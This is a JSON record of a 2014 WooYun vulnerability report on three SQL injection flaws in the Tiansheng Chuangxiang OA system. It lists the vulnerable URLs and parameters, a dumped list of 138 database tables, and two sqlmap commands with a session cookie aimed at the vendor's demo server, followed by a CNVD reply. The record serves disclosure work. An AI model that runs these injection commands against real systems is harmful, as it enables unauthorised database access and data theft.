{"id": 49529, "wybug_id": "wooyun-2014-073173", "wybug_title": "天生创想OA系统三个注入（无需登录）", "wybug_corp": "天生创想OA", "wybug_author": "D_in", "wybug_date": "2014-08-20 18:46", "wybug_open_date": "2014-11-18 18:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-18：\t细节向公众公开  简要描述： 今天中午睡了个午觉，梦到自己升职加薪，当上总经理，出任ceo，迎娶了白富美，想想都觉得激动，老板一脚踢过来，“你，过去把这些砖搬到七楼去”。 详细说明：  只测试了官方的demo地址：http://oa.515158.com第一处：\nhttp://oa.515158.com/ntko/FileEdit.php?fileType=word&FileId=51515800000&filenumber=514238140820103755&officetype=1&uid=2&date=2014-08-20%2010:37:55\nFileId存在注入，此注入点无需登录\n\n\n\n一共有138个表Database: oa2013                                                               [138 tables]+-----------------------------+| tempaq                      || toa_ads                     || toa_app                     || toa_app_flow                || toa_app_flow_view           || toa_app_log                 || toa_app_option              || toa_app_title               || toa_app_type                || toa_approval                || toa_attachment              || toa_bbs                     || toa_bbs_log                 || toa_bbsclass                || toa_blog                    || toa_book                    || toa_book_read               || toa_book_type               || toa_communication           || toa_conference              || toa_conference_record       || toa_config                  || toa_crm_business            || toa_crm_care                || toa_crm_company             || toa_crm_complaints          || toa_crm_contact             || toa_crm_contract            || toa_crm_db                  || toa_crm_flow                || toa_crm_form                || toa_crm_log                 || toa_crm_offer               || toa_crm_order               || toa_crm_payment             || toa_crm_personnel           || toa_crm_personnel_log       || toa_crm_pord_type           || toa_crm_price               || toa_crm_prod_view           || toa_crm_product             || toa_crm_program             || toa_crm_purchase            || toa_crm_service             || toa_crm_stock               || toa_crm_supplier            || toa_department              || toa_distribution            || toa_document                || toa_document_type           || toa_duty                    || toa_duty_log                || toa_duty_user               || toa_file                    || toa_file_read               || toa_file_type               || toa_fileoffice              || toa_goods_purchase          || toa_goods_purchase_view     || toa_goods_type              || toa_human_db                || toa_human_form              || toa_human_info              || toa_humancontract           || toa_job                     || toa_job_demand              || toa_job_hire                || toa_job_talent              || toa_keytable                || toa_knowledge               || toa_loginlog                || toa_menu                    || toa_mobile_model            || toa_news                    || toa_news_read               || toa_news_type               || toa_ntkohtmlfile            || toa_ntkoofficefile          || toa_ntkopdffile             || toa_oalog                   || toa_office_goods            || toa_office_goods_key        || toa_office_goods_record     || toa_office_goods_stock      || toa_office_type             || toa_online                  || toa_personnel               || toa_personnel_log           || toa_phone_channel           || toa_phone_receive           || toa_phone_send              || toa_plan                    || toa_plugin                  || toa_position                || toa_project                 || toa_project_db              || toa_project_duty            || toa_project_duty_log        || toa_project_flow            || toa_project_from            || toa_project_log             || toa_project_model           || toa_project_personnel       || toa_project_personnel_log   || toa_project_template        || toa_project_type            || toa_property                || toa_property_depreciation   || toa_property_type           || toa_registration            || toa_registration_log        || toa_rewards                 || toa_seal                    || toa_session                 || toa_sms_receive             || toa_sms_send                || toa_training                || toa_training_record         || toa_upload                  || toa_user                    || toa_user_view               || toa_usergroup               || toa_wage                    || toa_wage_basis              || toa_wage_data               || toa_wage_log                || toa_wage_type               || toa_web                     || toa_workclass               || toa_workclass_charts        || toa_workclass_db            || toa_workclass_flow          || toa_workclass_from          || toa_workclass_personnel     || toa_workclass_personnel_log || toa_workclass_template      || toa_workclass_type          || toa_workdate                |+-----------------------------+第二处注入：\nhttp://oa.515158.com/admin.php?ischeck=&ac=file_read&do=list&fileurl=file&vuidtype=&type=1&number=&title=&vstartdate=&venddate=\nnumber参数存在注入，需带cookie\nsqlmap -u \"http://oa.515158.com/admin.php?ischeck=&ac=file_read&do=list&fileurl=file&vuidtype=&type=1&number=&title=&vstartdate=&venddate=\" --cookie \"toa_auth=Mgk4NzE0ODY4OWJjZDE3Mjg3NGFjMDllOWE1Y2Y4MzlmZQ%3D%3D\" -p \"number\" --current-db\n\n\n第三处注入：\nhttp://oa.515158.com/admin.php?ac=department&fileurl=wage&do=log&wid=132\nwid参数存在注入需带上cookie\nsqlmap -u \"http://oa.515158.com/admin.php?ac=department&fileurl=wage&do=log&wid=132\" -p \"wid\" --cookie \"toa_auth=Mgk4NzE0ODY4OWJjZDE3Mjg3NGFjMDllOWE1Y2Y4MzlmZQ%3D%3D\" --current-user\n\n\n   漏洞证明：  第一处：\nhttp://oa.515158.com/ntko/FileEdit.php?fileType=word&FileId=51515800000&filenumber=514238140820103755&officetype=1&uid=2&date=2014-08-20%2010:37:55\n\n\n\n\n第二处：\nhttp://oa.515158.com/admin.php?ischeck=&ac=file_read&do=list&fileurl=file&vuidtype=&type=1&number=&title=&vstartdate=&venddate=\n\n\n第三处：\nhttp://oa.515158.com/admin.php?ac=department&fileurl=wage&do=log&wid=132\n\n\n   修复方案：  厂商太厉害都不敢给建议啊   版权声明：转载请注明来源 D_in@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-08-25 09:20 厂商回复： CNVD确认所述情况，根据此前协调该公司的处置情况，对方拒绝处置，已向此前获知的QQ邮箱发送通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-20 19:54 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  关注    \n     2014-08-21 13:58 |    \t\tx44s \t\t\t( 普通白帽子  |\t\t\t        Rank:136 漏洞数:16        | boom)\t\t \n  补充处置情况：CNVD确认所述情况（不直接复现存储型XSS），根据以往处置情况，已经将天生创想公司列入黑名单（对方一直拒绝处置漏洞）    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}